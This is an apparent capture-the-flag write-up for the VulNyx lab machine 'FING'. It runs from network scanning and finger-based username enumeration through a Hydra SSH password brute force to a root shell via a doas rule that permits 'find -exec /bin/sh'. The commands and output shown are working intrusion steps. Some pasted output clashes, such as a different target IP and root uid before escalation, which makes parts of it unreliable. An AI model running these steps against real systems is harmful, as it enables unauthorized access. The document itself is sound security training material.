# [VulNyx](https://vulnyx.com/): FING Writeup  

<img width="673" height="406" alt="Screenshot 2026-05-25 153616" src="https://github.com/user-attachments/assets/9795af0e-c293-4a6d-aa81-c6aa1f1c7843" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine Name:** FING  
- **Key Vulnerabilities:**
  - Finger Service User Enumeration
  - Weak SSH Credentials
  - Misconfigured `doas` Permissions
  - Privilege Escalation via `find`

---

# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```text
$ sudo arp-scan  --localnet               
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.29.1    d8:78:c9:99:bc:d9       (Unknown)
192.168.29.93   00:0c:29:b6:0a:0f       (Unknown)
192.168.29.180  ca:df:ed:b9:e8:2c       (Unknown: locally administered)
192.168.29.205  00:f1:f3:f9:16:4e       (Unknown)
192.168.29.122  c2:22:42:ed:a2:c0       (Unknown: locally administered)
192.168.29.205  00:f1:f3:f9:16:4e       (Unknown) (DUP: 2)
192.168.29.122  c2:22:42:ed:a2:c0       (Unknown: locally administered) (DUP: 2)

50 packets received by filter, 0 packets dropped by kernel
End
```

The target machine IP address was identified as:

```text
192.168.29.93
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.93
```

## Scan Results

```bash
$ nmap -n -Pn -sVS  -p- --min-rate 5000  192.168.29.93
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 02:09 -0700
Nmap scan report for 192.168.29.93
Host is up (0.00078s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
79/tcp open  finger  Linux fingerd
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
MAC Address: 00:0C:29:B6:0A:0F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

### Findings
- Port **22** → SSH
- Port **79** → Finger Service
- Port **80** → HTTP

The Finger service appeared particularly interesting because it can sometimes allow user enumeration.

---

# 🌐 Web Enumeration

Open port 80 in the browser.

### Observation
<img width="1076" height="537" alt="Screenshot 2026-05-25 151857" src="https://github.com/user-attachments/assets/70324cf7-611d-436a-96f9-e6bae0206614" />

The website displayed only the default Apache landing page.

No useful information was discovered.

---

# 📂 Directory Enumeration

Use Gobuster to search for hidden directories:

```bash
gobuster dir -u http://192.168.29.93/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Result

```text
$ gobuster dir -u http://192.168.29.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.29.93/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
server-status        (Status: 403) [Size: 278]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

No additional directories or sensitive files were discovered.

---

# 🔍 User Enumeration via Finger Service

Use the `finger-user-enum` script from PentestMonkey to enumerate usernames through the Finger service.

```bash
./finger-user-enum.pl -U users.txt -t 192.168.29.93
```

## Result

```text
$ ./finger-user-enum.pl -U users.txt -t 10.229.52.4  
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 10735
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Mon May 25 02:44:54 2026 #########

adam@10.229.52.4: Login: adam  Name: adam..Directory: /home/adam Shell: /bin/bash..Last login Wed May 20 11:53 (CEST) on pts/0 from 192.168.29.56..No mail...No Plan...

```

### Important Finding
A valid username was identified:

```text
adam
```

---

# 🔓 SSH Brute Force

Use Hydra to brute-force the SSH password:

```bash
hydra -l adam -P /usr/share/wordlists/rockyou.txt \
ssh://192.168.29.93
```

## Result

```text
$ hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.29.93
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 02:48:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.29.93:22/
[STATUS] 209.00 tries/min, 209 tries in 00:01h, 14344192 to do in 1143:53h, 14 active
[STATUS] 222.67 tries/min, 668 tries in 00:03h, 14343733 to do in 1073:38h, 14 active
[22][ssh] host: 192.168.29.93   login: adam   password: passion
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 02:52:11

```

### Valid Credentials

```text
Username: adam
Password: passion
```

---

# 🖥 Initial Access

Login through SSH:

```bash
ssh adam@192.168.29.93
```

## Verification

```bash
id ; whoami ; hostname
```

## Result

```bash
$ ssh adam@192.168.29.93                  
The authenticity of host '192.168.29.93 (192.168.29.93)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.29.93' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

adam@192.168.29.93's password: 
Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Wed May 20 11:45:12 2026
adam@fing:~$  id ; whoami ; hostname
uid=0(adam) gid=0(adam) grupos=0(adam)
adam
fing
```

Successfully gained access as user `adam`.

---

# 🔍 SUID Enumeration

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

## Result

```text
adam@fing:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/doas
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### Important Finding
The `/usr/bin/doas` binary appeared particularly interesting.

---

# ⚠️ Doas Configuration Analysis

Check the `doas` configuration file:

```bash
cat /etc/doas.conf
```

## Result

```text
adam@fing:~$ cat /etc/doas.conf 
permit nopass keepenv adam as root cmd /usr/bin/find
```

### Explanation
The configuration allows user `adam` to execute `/usr/bin/find` as root without a password.

---

# 🚀 Privilege Escalation

Use `doas` with `find` to spawn a root shell:

```bash
doas -u root /usr/bin/find . -exec /bin/sh \;
```

## Result

```text
adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh \;
# 
```

Successfully obtained a root shell.

---

# 🔧 Upgrading to Interactive Shell

Spawn a fully interactive shell:

```bash
script /dev/null -c bash
```

---

# 👑 Verification

Check the current user:

```bash
id ; whoami ; hostname
```

## Result

```bash
root@fing:/home/adam# id ; whoami ; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
fing
```

Successfully escalated privileges to root.

---

# 🏁 Flags

## Locate Flags

```bash
find / -type f -name root.txt -o -name user.txt 2>/dev/null
```

## Result

```text
root@fing:~# find / -type f -name root.txt -o -name user.txt 2</dev/null
/root/root.txt
/home/fing/user.txt
```

---

# 📄 User Flag

```bash
cat /home/fing/user.txt
```

```text
ff18a9aca2d1dac41a5c26**********
```

---

# 👑 Root Flag

```bash
cat /root/root.txt
```

```text
1edf2dfe68c6745e93affa**********
```

---
---
## 🔍 About `doas`

`doas` is a lightweight privilege escalation utility originally developed for OpenBSD as an alternative to `sudo`. It allows specific users to execute commands as another user, usually `root`, based on rules defined in the `/etc/doas.conf` configuration file.

Unlike `sudo`, `doas` is designed to be simpler and easier to configure while still providing controlled privilege escalation capabilities.

In this machine, the configuration file contained the following rule:

```text
permit nopass keepenv adam as root cmd /usr/bin/find
```

### Explanation
- `permit` → Allows command execution  
- `nopass` → No password required  
- `keepenv` → Preserves environment variables  
- `adam as root` → User `adam` can run commands as `root`  
- `cmd /usr/bin/find` → Only the `find` command is permitted  

Since the `find` binary supports command execution through the `-exec` option, it can be abused to spawn a root shell.

This misconfiguration allowed direct privilege escalation to the root user.
---
# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| User Enumeration | Finger Service |
| Credential Attack | Hydra |
| Initial Access | SSH |
| Privilege Escalation | Misconfigured `doas` |
| Root Access | `find` Exploitation |

---

# 🚀 Key Takeaways

- The Finger service can leak valid usernames.
- Weak SSH passwords remain a critical security risk.
- Always enumerate SUID binaries during privilege escalation.
- Misconfigured `doas` rules can directly lead to root access.
- GTFOBins techniques are highly effective during post-exploitation.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
